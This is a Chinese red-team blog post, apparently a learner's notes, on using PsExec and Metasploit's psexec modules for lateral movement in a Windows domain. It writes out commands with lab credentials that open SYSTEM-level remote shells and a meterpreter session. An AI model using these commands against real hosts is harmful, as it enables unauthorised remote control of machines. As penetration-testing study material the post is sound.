\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s/XrZ5mKII\_aJe0OihDuUpdw)

渗透攻击红队

一个专注于红队攻击的公众号

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDoZibS8XU01CtEtSbwM3VGr3qskOmA1VkccY0mwKTCq6u2ia1xYRwBn3A/640?wx_fmt=jpeg)

  

  

大家好，这里是 **渗透攻击红队** 的第 **27** 篇文章，本公众号会记录一些我学习红队攻击的复现笔记（由浅到深），不出意外每天一更

![](https://mmbiz.qpic.cn/mmbiz_gif/7QRTvkK2qC4T65TNkYZsPg2BJ2VwibZicuBhV9DGqxlsxwG0n2ibhLuBsiamU7S0SqvAp6p33ucxPkuiaDiaKD6ibJGaQ/640?wx_fmt=gif)

PsExec

PsExec 主要用于大批量 Windows 主机的维护，在域环境下效果尤其好。（因为 PsExec 是 Windows 提供的工具，所以杀毒软件将其列入白名单中）

因为使用 PsExec 通过命令行环境与目标机器建立连接，甚至控制目标机器，而不需要通过远程桌面（RDP）进行图形化的控制。

PsExec 包含在 PsTools 工具包中，下载地址：https://download.sysinternals.com/files/PSTools.zip

通过 PsExec 可以在远程目标主机上执行命令，也可以将管理员权限提升到 System 权限以运行指定的程序。

PsExec 的基本原理是：通过管道在远程目标主机上创建一个 psexec 服务，并在本地磁盘中生成一个名为”PSEXESVC“的二进制文件，然后通过 psexec 服务运行命令，运行结束后删除服务。

**PsExec 的使用**

**PsExec 的使用**

* * *

首先，需要获取目标操作系统的交互式 Shell。在建立了 ipc$ 的情况下：

```
net use \\\\192.168.3.21 /u:god\\administrator Admin12345
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LJoqc3JzTnQecISVaWxvp1J26P4D1JQicSUueLPjo6khiconuCqRQic5uibs8Cab8gUmHT9fQ3CSwGpVQ/640?wx_fmt=png)  

执行如下命令，获取 System 权限的 Shell：

```
PsExec.exe -accepteula \\\\192.168.3.21 -s cmd.exe

# -accepteula  第一次运行 PsExec 会弹出确认框，使用该参数就不会弹出确认框
# -s      以System权限运行远程进程，获得一个System权限的交互式Shell，如果不用这个参数，那么会获得一个administrator权限的shell
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LJoqc3JzTnQecISVaWxvp1JBkAhvH8LQdScIPxT4ibuCLPtEpPr2vKnbNh2XKIPgm2vLxSjdscsjyQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LJoqc3JzTnQecISVaWxvp1JhR0zx6uAl3Aicr73tBnBkybxXJZOGEDibVE6pap9uu4ziaqN93XoIzjTw/640?wx_fmt=png)

获得一个 administrator 权限的 shell：  

```
PsExec.exe -accepteula \\\\192.168.3.21 cmd.exe
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LJoqc3JzTnQecISVaWxvp1Jc2fDXAW2rcvXygRot56R3u5E6tiapxJQVcc6zqWAZT4TJlcAxmEG2Gg/640?wx_fmt=png)

如果没有建立 ipc$，PsExec 有两个参数可以通过指定的账号和密码进行远程连接：

```
PsExec.exe \\\\192.168.3.21 -u god\\administrator -p Admin12345 cmd.exe

# -u  域\\用户名
# -p  密码
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LJoqc3JzTnQecISVaWxvp1JbCwsOZsl1DMKk5CialsobaAxKkUT7ibEiapc5Tsg5ULpVMawDF0hn9s4w/640?wx_fmt=png)

使用 PsExec 在远程计算机上执行命令进行回显：

```
PsExec.exe \\\\192.168.3.21 -u god\\administrator -p Admin12345 cmd /c "ipconfig"
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LJoqc3JzTnQecISVaWxvp1Jzt8acuebVBlYPrbYLYhngPeTboW5siaMkGFJkNMANszCHJ7LJUblFUA/640?wx_fmt=png)

* * *

**PsExec 的注意事项**

需要远程系统开启 admin$ 共享（默认是开启的），原理是基于 IPC$ 共享，目标需要开放 445 端口和 admin$ 共享

在使用 IPC 连接目标系统后，不需要输入账户和密码。

在使用 PsExec 执行远程命令时，会在目标系统中创建一个 psexec 的服务。命令执行完后，psexec 服务将被自动删除。由于创建或删除服务时会产生大量的日志，可以在攻击溯源时通过日志反推攻击流程。

使用 PsExec 可以直接获得 System 权限的交互式 Shell（前提目标是 administrator 权限的 shell）

在域环境测试时发现，非域用户无法利用内存中的票据使用 PsExec 功能，只能依靠账号和密码进行传递。

* * *

**Metasploit 使用 PsExec 模块**

查找有关 psexec 的模块：

```
search psexec
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LJoqc3JzTnQecISVaWxvp1JT5IKct1eEddC8yHjQicyumdhhp3lsIgueBgdopR7U9c804Y9DqpLfQg/640?wx_fmt=png)

有两个常用的模块：

```
exploit/windows/smb/psexec
exploit/windows/smb/psexec\_psh（Powershell 版本的 psexec）
```

使用模块：  

```
use exploit/windows/smb/psexec
set rhosts 192.168.2.25
set smbuser administrator
set smbpass Admin12345
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LJoqc3JzTnQecISVaWxvp1JxPpOCuEcB3388a42IMuoj19WHqVSsuFZNKia73fPIwcJ5YEJSdvjVvQ/640?wx_fmt=png)

运行 exploit ，运行脚本会获得一个 meterpreter：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LJoqc3JzTnQecISVaWxvp1JaiauxriaibevAMNtCSfkq6huQnc7rymIxtc43j4AkkLWna150KETyJfBQ/640?wx_fmt=png)

输入 shell，会获得一个 system 权限的 shell：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LJoqc3JzTnQecISVaWxvp1Jn8AiaVeXIXBs2OKQcCjPlwWTM8SsAMw94AeBvDwOgzO1BO1vHxgMnbg/640?wx_fmt=png)

psexec\_psh 模块和 psexec 模块的使用方法相同，二者的区别在于，通过 psexec\_psh 模块上传的 payload 是 powershell 版本的。

* * *

渗透攻击红队 发起了一个读者讨论 快来发表你的评论把！ 精选讨论内容

等着学习，一天进步一点 哈哈

参考文章：

https://zhuanlan.zhihu.com/p/228742108

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  

渗透攻击红队

一个专注于渗透红队攻击的公众号

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDdjBqfzUWVgkVA7dFfxUAATDhZQicc1ibtgzSVq7sln6r9kEtTTicvZmcw/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDY9HXLCT5WoDFzKP1Dw8FZyt3ecOVF0zSDogBTzgN2wicJlRDygN7bfQ/640?wx_fmt=png)

点分享

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDRwPQ2H3KRtgzicHGD2bGf1Dtqr86B5mspl4gARTicQUaVr6N0rY1GgKQ/640?wx_fmt=png)

点点赞

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDgRo5uRP3s5pLrlJym85cYvUZRJDlqbTXHYVGXEZqD67ia9jNmwbNgxg/640?wx_fmt=png)

点在看